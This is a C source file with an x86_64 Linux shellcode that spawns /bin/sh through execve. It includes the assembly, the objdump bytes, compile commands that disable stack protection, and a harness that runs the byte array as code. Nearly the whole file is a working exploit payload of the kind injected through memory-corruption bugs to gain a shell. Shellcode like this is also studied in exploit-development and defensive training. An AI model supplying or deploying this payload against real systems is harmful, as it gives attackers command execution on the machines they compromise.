/*
*********
$ Infos $
*********
Created by: vida
Github: https://github.com/vida00/
Command: excve("/bin/sh", NULL, NULL);
For: linux x86_64

*****************
$ Assembly Code $
*****************
section .text
        global _start
_start:
        xor rdx, rdx
        xor rsi, rsi
        push rax
        mov rdi, 0x68732f6e69622f2f
        push rdi
        mov rdi, rsp
        mov al, 0x3b
        syscall

******************
$ objdump result $
******************
0000000000400080 <_start>:
  400080:       48 31 d2                xor    %rdx,%rdx
  400083:       48 31 f6                xor    %rsi,%rsi
  400086:       50                      push   %rax
  400087:       48 bf 2f 2f 62 69 6e    movabs $0x68732f6e69622f2f,%rdi
  40008e:       2f 73 68
  400091:       57                      push   %rdi
  400092:       48 89 e7                mov    %rsp,%rdi
  400095:       b0 3b                   mov    $0x3b,%al
  400097:       0f 05                   syscall

*****************
$ Compile & Run $
*****************
C: gcc shellcode.c -o shellcode -z execstack
Assembly: nasm shellcode.asm -f elf64 && ld shellcode.o -o shellcode
*/

unsigned char shellcode[] = \
"\x48\x31\xd2\x48\x31\xf6\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05";
int main()
{
    int (*ret)() = (int(*)())shellcode;
    ret();
}
